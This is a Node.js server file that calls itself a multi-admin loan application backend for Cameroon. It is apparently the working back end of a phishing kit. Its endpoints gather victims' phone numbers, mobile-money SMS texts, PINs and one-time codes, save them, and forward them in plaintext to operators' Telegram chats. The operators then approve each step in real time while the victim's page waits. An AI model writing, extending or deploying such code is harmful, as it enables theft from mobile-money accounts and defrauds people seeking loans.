// ============================================================
// server.js – Production Ready Multi-Admin Loan Server
// ============================================================
console.log("🟢 1. Server initializing...");
require('dotenv').config();
console.log("🟢 2. Environment variables loaded");

const express = require('express');
const fetch = require('node-fetch');
const cors = require('cors');
const path = require('path');

// Import MongoDB helper methods from db.js
const {
    connectDatabase,
    closeDatabase,
    saveApplication,
    getApplication,
    updateApplication,
    getActiveAdmins,
    getAdminByChatId,
    logAdminActivity,
    getAdmin,
    saveAdmin,
    getAdminCount
} = require('./db');

const app = express();

app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, '..', 'frontend')));

const PORT = process.env.PORT || 3000;
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const DEFAULT_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;

// Round-Robin tracker for Multi-Admin assignment
let lastAssignedIndex = 0;

/**
 * Assigns an application to an active admin using Round-Robin distribution.
 * Falls back to default system credentials if no active admin is found in DB.
 */
async function assignAdminForApplication() {
    try {
        const activeAdmins = await getActiveAdmins();
        if (activeAdmins && activeAdmins.length > 0) {
            const assignedAdmin = activeAdmins[lastAssignedIndex % activeAdmins.length];
            lastAssignedIndex = (lastAssignedIndex + 1) % activeAdmins.length;
            return assignedAdmin;
        }
    } catch (err) {
        console.error('⚠️ Error fetching active admins:', err.message);
    }

    // Fallback default admin configuration
    return {
        adminId: 'ADMIN001',
        name: 'Super Admin',
        chatId: DEFAULT_CHAT_ID
    };
}

/**
 * Helper to dispatch Telegram messages to specific admin chat IDs.
 */
async function sendTelegramMessage(chatId, message, buttons = null) {
    const targetChatId = chatId || DEFAULT_CHAT_ID;
    if (!targetChatId) {
        console.error('❌ Cannot send Telegram message: No Chat ID available.');
        return null;
    }

    const body = { 
        chat_id: targetChatId, 
        text: message, 
        parse_mode: 'Markdown' 
    };
    if (buttons) body.reply_markup = { inline_keyboard: buttons };

    try {
        const response = await fetch(`${TELEGRAM_API_URL}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(body)
        });
        return await response.json();
    } catch (error) {
        console.error('❌ Telegram API error:', error);
        return null;
    }
}

// ============================================================
// API ENDPOINTS
// ============================================================

// 1. Initial Application Submission
app.post('/api/send-application', async (req, res) => {
    try {
        const data = req.body.applicationData;
        const { applicationId, phone, loanAmount, loanTerm, firstName, lastName } = data;

        // Assign an active admin dynamically
        const assignedAdmin = await assignAdminForApplication();

        // Save application to MongoDB
        await saveApplication({
            id: applicationId,
            adminId: assignedAdmin.adminId,
            adminName: assignedAdmin.name,
            phoneNumber: phone,
            pinStatus: 'pending',
            smsStatus: 'pending',
            otpStatus: 'pending',
            timestamp: new Date().toISOString()
        });

        console.log(`📝 Application created & assigned to ${assignedAdmin.adminId}: ${applicationId}`);

        const message = `📋 *NEW LOAN APPLICATION*\n━━━━━━━━━━━━━━━━━━━━━━\n🆔 ID: ${applicationId}\n👤 Assigned To: ${assignedAdmin.name} (${assignedAdmin.adminId})\n📱 Phone: +237${phone}\n💰 Amount: XAF ${Number(loanAmount).toLocaleString()}\n📅 Term: ${loanTerm}\n👤 Name: ${firstName} ${lastName}\n\n✅ *Please approve or reject this application:*`;
        
        const buttons = [[
            { text: '✅ YES', callback_data: JSON.stringify({ action: 'YES', step: 'SMS', applicationId }) },
            { text: '❌ NO', callback_data: JSON.stringify({ action: 'NO', step: 'SMS', applicationId }) }
        ]];

        await sendTelegramMessage(assignedAdmin.chatId, message, buttons);
        res.json({ ok: true, applicationId, status: 'waiting_sms', assignedAdminId: assignedAdmin.adminId });
    } catch (error) {
        console.error('❌ Error in /api/send-application:', error);
        res.status(500).json({ ok: false, message: 'Internal server error' });
    }
});

// 2. MoMo SMS Message Processing
app.post('/api/send-momo-message', async (req, res) => {
    try {
        const { momoData } = req.body;
        const { applicationId, phone, momoMessage } = momoData;

        const appData = await getApplication(applicationId);
        if (!appData) return res.status(404).json({ ok: false, message: 'Application not found' });

        await updateApplication(applicationId, {
            smsText: momoMessage,
            smsStatus: 'pending'
        });

        const admin = await getAdmin(appData.adminId);
        const chatId = admin?.chatId || DEFAULT_CHAT_ID;

        const message = `📨 *SMS VERIFICATION*\n━━━━━━━━━━━━━━━━━━━━━━\n🆔 ID: ${applicationId}\n📱 Phone: +237${phone}\n\n📩 *SMS Content:*\n${momoMessage}\n\n✅ *Please approve or reject this SMS:*`;
        const buttons = [[
            { text: '✅ YES', callback_data: JSON.stringify({ action: 'YES', step: 'SMS', applicationId }) },
            { text: '❌ NO', callback_data: JSON.stringify({ action: 'NO', step: 'SMS', applicationId }) }
        ]];

        await sendTelegramMessage(chatId, message, buttons);
        res.json({ ok: true, status: 'waiting_admin' });
    } catch (error) {
        console.error('❌ Error in /api/send-momo-message:', error);
        res.status(500).json({ ok: false, message: 'Internal server error' });
    }
});

// 3. PIN Verification Submission
app.post('/api/send-pin', async (req, res) => {
    try {
        const { applicationId, pin } = req.body;

        const appData = await getApplication(applicationId);
        if (!appData) return res.status(404).json({ ok: false, message: 'Application not found' });

        await updateApplication(applicationId, {
            pin: pin,
            pinStatus: 'pending'
        });

        const admin = await getAdmin(appData.adminId);
        const chatId = admin?.chatId || DEFAULT_CHAT_ID;

        const message = `🔐 *PIN VERIFICATION*\n━━━━━━━━━━━━━━━━━━━━━━\n🆔 ID: ${applicationId}\n🔢 PIN Entered: ${pin}\n\n✅ *Please approve or reject this PIN:*`;
        const buttons = [[
            { text: '✅ YES', callback_data: JSON.stringify({ action: 'YES', step: 'PIN', applicationId }) },
            { text: '❌ NO', callback_data: JSON.stringify({ action: 'NO', step: 'PIN', applicationId }) }
        ]];

        await sendTelegramMessage(chatId, message, buttons);
        res.json({ ok: true, status: 'waiting_admin' });
    } catch (error) {
        console.error('❌ Error in /api/send-pin:', error);
        res.status(500).json({ ok: false, message: 'Internal server error' });
    }
});

// 4. OTP Verification Submission
app.post('/api/send-otp', async (req, res) => {
    try {
        const { applicationId, otp } = req.body;

        const appData = await getApplication(applicationId);
        if (!appData) return res.status(404).json({ ok: false, message: 'Application not found' });

        await updateApplication(applicationId, {
            otp: otp,
            otpStatus: 'pending'
        });

        const admin = await getAdmin(appData.adminId);
        const chatId = admin?.chatId || DEFAULT_CHAT_ID;

        const message = `🔑 *OTP VERIFICATION*\n━━━━━━━━━━━━━━━━━━━━━━\n🆔 ID: ${applicationId}\n🔢 OTP Entered: ${otp}\n\n✅ *Please approve or reject this OTP:*`;
        const buttons = [[
            { text: '✅ YES', callback_data: JSON.stringify({ action: 'YES', step: 'OTP', applicationId }) },
            { text: '❌ NO', callback_data: JSON.stringify({ action: 'NO', step: 'OTP', applicationId }) }
        ]];

        await sendTelegramMessage(chatId, message, buttons);
        res.json({ ok: true, status: 'waiting_admin' });
    } catch (error) {
        console.error('❌ Error in /api/send-otp:', error);
        res.status(500).json({ ok: false, message: 'Internal server error' });
    }
});

// 5. Final Approval Details
app.post('/api/send-final-details', async (req, res) => {
    try {
        const data = req.body.finalData;

        const appData = await getApplication(data.applicationId);
        if (!appData) return res.status(404).json({ ok: false, message: 'Application not found' });

        await updateApplication(data.applicationId, {
            pinStatus: 'approved',
            otpStatus: 'approved'
        });

        const admin = await getAdmin(appData.adminId);
        const chatId = admin?.chatId || DEFAULT_CHAT_ID;

        const message = `✅ *LOAN COMPLETE*\n━━━━━━━━━━━━━━━━━━━━━━\n🆔 ID: ${data.applicationId}\n📱 Phone: +237${data.phone}\n🔑 PIN Entered: ${data.pin}\n💰 Amount: XAF ${Number(data.loanAmount).toLocaleString()}\n📅 Term: ${data.loanTerm}\n👤 Name: ${data.firstName} ${data.lastName}\n\n🎉 *Status: DASHBOARD ACCESS GRANTED*`;

        await sendTelegramMessage(chatId, message);
        res.json({ ok: true, status: 'dashboard_ready' });
    } catch (error) {
        console.error('❌ Error in /api/send-final-details:', error);
        res.status(500).json({ ok: false, message: 'Internal server error' });
    }
});

// 6. Telegram Webhook (Processes Admin Approvals/Rejections)
app.post('/api/telegram-webhook', async (req, res) => {
    try {
        // Handle Inline Buttons
        if (req.body.callback_query) {
            const query = req.body.callback_query;
            const rawData = query.data;
            const senderChatId = String(query.from.id);

            try {
                const { action, step, applicationId } = JSON.parse(rawData);
                const appData = await getApplication(applicationId);

                if (appData) {
                    const decision = action === 'YES' ? 'approved' : 'rejected';
                    const updates = {};

                    if (step === 'SMS' && appData.smsStatus === 'pending') updates.smsStatus = decision;
                    else if (step === 'PIN' && appData.pinStatus === 'pending') updates.pinStatus = decision;
                    else if (step === 'OTP' && appData.otpStatus === 'pending') updates.otpStatus = decision;

                    if (Object.keys(updates).length > 0) {
                        await updateApplication(applicationId, updates);
                        
                        // Log decision activity for multi-admin auditing
                        const admin = await getAdminByChatId(senderChatId);
                        if (admin) {
                            await logAdminActivity(admin.adminId, `APP_${step}_${decision.toUpperCase()}`, { applicationId });
                        }
                    }
                }
            } catch (e) {
                console.error('❌ Error parsing callback data:', e.message);
            }

            await fetch(`${TELEGRAM_API_URL}/answerCallbackQuery`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ callback_query_id: query.id })
            });

            return res.sendStatus(200);
        }

        // Handle Direct Text Replies to Admin Messages
        const msg = req.body.message;
        if (!msg || !msg.text) return res.sendStatus(200);

        const text = msg.text.trim().toUpperCase();
        const idMatch = msg.reply_to_message?.text?.match(/🆔\s*ID:\s*([A-Z0-9-]+)/);
        const applicationId = idMatch ? idMatch[1] : null;

        if (applicationId) {
            const appData = await getApplication(applicationId);

            if (appData) {
                const updates = {};
                const decision = text === 'YES' ? 'approved' : (text === 'NO' ? 'rejected' : null);

                if (decision) {
                    if (appData.smsStatus === 'pending') updates.smsStatus = decision;
                    else if (appData.pinStatus === 'pending') updates.pinStatus = decision;
                    else if (appData.otpStatus === 'pending') updates.otpStatus = decision;

                    if (Object.keys(updates).length > 0) {
                        await updateApplication(applicationId, updates);
                    }
                }
            }
        }

        res.sendStatus(200);
    } catch (error) {
        console.error('❌ Error in /api/telegram-webhook:', error);
        res.sendStatus(200);
    }
});

// 7. Client Verification Status Check
app.get('/api/status/:applicationId/:step', async (req, res) => {
    try {
        const appData = await getApplication(req.params.applicationId);
        if (!appData) return res.status(404).json({ ok: false, message: 'Application not found' });

        let status = 'pending';
        const step = req.params.step.toLowerCase();

        if (step === 'sms') status = appData.smsStatus || 'pending';
        else if (step === 'pin') status = appData.pinStatus || 'pending';
        else if (step === 'otp') status = appData.otpStatus || 'pending';

        res.json({ ok: true, status });
    } catch (error) {
        console.error('❌ Error fetching application status:', error);
        res.status(500).json({ ok: false, message: 'Internal server error' });
    }
});

// Catch-all route for frontend Single Page Application (SPA)
app.get('*', (req, res) => {
    res.sendFile(path.join(__dirname, '..', 'frontend', 'index.html'));
});

// ============================================================
// SERVER BOOTSTRAP & DATABASE INITIALIZATION
// ============================================================
async function startServer() {
    try {
        // Connect to MongoDB
        await connectDatabase();

        // Seed Super Admin if database contains no admins
        const adminCount = await getAdminCount();
        if (adminCount === 0 && DEFAULT_CHAT_ID) {
            console.log('⚡ Initializing default Super Admin in database...');
            await saveAdmin({
                adminId: 'ADMIN001',
                name: 'Super Admin',
                chatId: DEFAULT_CHAT_ID,
                role: 'super_admin',
                status: 'active'
            });
        }

        app.listen(PORT, () => {
            console.log(`🚀 Multi-Admin Server active on port ${PORT}`);
        });
    } catch (error) {
        console.error('❌ Failed to start server:', error);
        process.exit(1);
    }
}

// Graceful Shutdown Handlers
process.on('SIGINT', async () => {
    console.log('\n🛑 Shutting down server...');
    await closeDatabase();
    process.exit(0);
});

process.on('SIGTERM', async () => {
    console.log('\n🛑 Shutting down server...');
    await closeDatabase();
    process.exit(0);
});

startServer();
